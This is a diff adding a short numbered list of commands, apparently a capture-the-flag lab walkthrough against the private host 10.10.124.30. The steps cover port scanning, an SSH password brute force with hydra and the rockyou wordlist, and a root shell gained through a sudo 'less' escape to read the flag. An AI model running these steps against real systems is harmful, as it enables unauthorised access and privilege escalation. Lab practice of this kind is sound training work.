@@ -1,0 +1,9 @@
+1 - nmap -A -p- 10.10.124.30
+2 - ftp 10.10.124.30
+3 - hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.124.30
+4 - ssh jake@10.10.124.30
+5 - sudo -l (less)
+6 - sudo less /etc/profile -> !/bin/sh
+7 - whoami
+8 - cat /root/root.txt
+
